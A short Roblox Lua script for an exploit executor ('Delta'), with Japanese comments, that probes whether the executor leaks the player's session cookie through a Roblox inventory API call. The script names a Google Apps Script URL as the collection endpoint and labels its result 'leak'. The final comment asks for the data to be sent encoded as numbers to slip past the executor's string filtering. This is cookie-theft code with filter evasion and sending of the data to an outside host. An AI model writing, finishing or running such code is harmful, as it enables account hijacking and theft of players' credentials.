local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
local user = game.Players.LocalPlayer.Name

local function stealthMission()
    local leak = "NOT_LEAKED"
    
    -- 手法：Robloxの公式「アセット発行API」に、わざと不正なリクエストを投げる
    -- その際、Deltaが「自動で付与してしまったクッキー」がエラー文に出ないか確認
    pcall(function()
        local http = game:GetService("HttpService")
        -- 自分のインベントリを確認するAPI（Deltaが許可している可能性が高い）
        local res = game:HttpGet("https://inventory.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/can-view-inventory")
        leak = "INV_API: " .. tostring(res)
    end)

    return leak
end

local finalResult = stealthMission()
-- 送信時は、さっきの「数字に変換する暗号化（encrypt）」を組み合わせて送ってくれ
-- （Deltaの文字列検閲を避けるため）
